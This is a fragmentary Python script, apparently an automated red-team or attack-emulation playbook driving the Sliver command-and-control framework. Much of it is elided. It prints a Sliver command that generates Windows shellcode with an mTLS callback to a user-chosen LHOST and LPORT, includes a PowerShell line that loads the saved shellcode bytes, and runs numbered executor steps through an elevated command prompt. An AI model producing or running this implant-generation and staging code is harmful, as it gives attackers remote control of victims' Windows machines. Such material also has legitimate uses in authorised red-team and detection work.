...
async def main():
    ...
    console.print(f"""\
    sliver > generate --mtls {user_params["LHOST"]}:{user_params["LPORT"]} --os windows --arch 64bit --format shellcode --save {user_params["SAVE_PATH"]}
    ...
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded shellcode payload file")
    ...
    $s=[System.IO.File]::ReadAllBytes('{user_params["SAVE_PATH"]}');
    ...
    log_command_execution()
    try:
        await sliver_executor.ls(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
    ...
    console.print(f"[bold cyan]\n📌[Elevated Command Prompt Executor] Step 22[/]")
